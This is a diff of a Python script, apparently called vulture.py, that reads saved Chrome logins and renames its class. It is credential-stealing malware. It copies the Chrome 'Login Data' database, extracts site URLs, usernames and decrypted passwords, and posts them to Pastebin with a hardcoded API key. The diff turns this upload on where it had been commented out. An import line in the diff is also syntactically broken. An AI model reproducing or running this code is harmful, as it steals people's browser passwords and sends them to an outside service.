@@ -1,37 +1,31 @@
-import sqlite3
-import win32crypt
-import getpass
-import os
-import argparse
-import urllib.parse
-import urllib.request
+import sqlite3, win32crypt, getpass, os argparse
+import urllib.parse, urllib.request
 from tempfile import gettempdir
 from subprocess import Popen
 from shutil import copy
 
-class Extractor:
+class Bird:
 
-	windows_username = os.getlogin()
 
-	key = '6fa308892fe32aad6568444477f63761'
-	url = 'http://pastebin.com/api/api_post.php'
-
+	pastebin_key = '6fa308892fe32aad6568444477f63761'
 	payload = ''
 
 	def pluck_passwords(self):
-		PATH = 'C:/Users/{}/AppData/Local/Google/Chrome/User Data/Default/Login Data'.format(self.windows_username)
 
+		PATH = 'C:/Users/{}/AppData/Local/Google/Chrome/User Data/Default/Login Data'.format(os.getlogin())
+
+		# Copies the chrome database over to the temporary directory.
 		copy(PATH, gettempdir())
 
-		PATH = gettempdir() + '\\Login Data'
-		conn = sqlite3.connect(PATH)
+		# SQLite Connection
+		conn = sqlite3.connect(PATH + '\\Login Data')
 		cur = conn.cursor()
+
 		user_data = None
 
 		try:
 			cur.execute('SELECT action_url, username_value, password_value FROM logins')
 			user_data = cur.fetchall()
-
 		except Exception:
 			print('\nError fetching passwords.')
 
@@ -42,27 +36,34 @@ class Extractor:
 			username = r[1]
 			host = r[0]
 
-			string = '{0}\n\t{1}\n\t{2}\n\n'.format(host, username, password)
-			self.payload += string
+			# Creates a string for each website / username / password combination
+			result = '{0}\n\t{1}\n\t{2}\n\n'.format(host, username, password)
 
-	def upload(self):
+			# Adds each result to the payload, ready to be uploaded.
+			self.payload += result
+
+	def upload_to_pastebin(self):
 		 
 		values = {
-			'api_dev_key': self.key,
+			'api_dev_key': self.pastebin_key,
 			'api_option': 'paste',
 			'api_paste_code' : self.payload,
 			'api_paste_private' : '1',
-			'api_paste_name' : 'vulture.py | {}'.format(self.windows_username),
+			'api_paste_name' : 'vulture.py | {}'.format(os.getlogin()),
 			'api_paste_expire_date' : 'N',
 			'api_paste_format' : 'python',
 		}
-		 
-		data = urllib.parse.urlencode(values)
-		data = data.encode('utf-8')
-		req = urllib.request.Request(self.url, data)
+		
+		# Encodes the values.
+		data = urllib.parse.urlencode(values).encode('utf-8')
+
+		# Sends a HTTP request to pastebin API.
+		req = urllib.request.Request('http://pastebin.com/api/api_post.php', data)
+
 		with urllib.request.urlopen(req) as response:
-		    the_page = response.read()
-		self.link = the_page.decode('utf-8')
+		    page = response.read()
+
+		return page.decode('utf-8')
 
 def main():
 
@@ -82,11 +83,9 @@ def main():
 	https://www.github.com/beagerr/vulture.py
 	  ''')
 
-	vulture = Extractor()
+	vulture = Bird()
 	vulture.pluck_passwords()
-	# vulture.upload()
-
-	# os.system('start {}'.format(vulture.link))
+	os.system('start {}'.format(vulture.upload_to_pastebin()))
 
 
 if __name__ == '__main__':
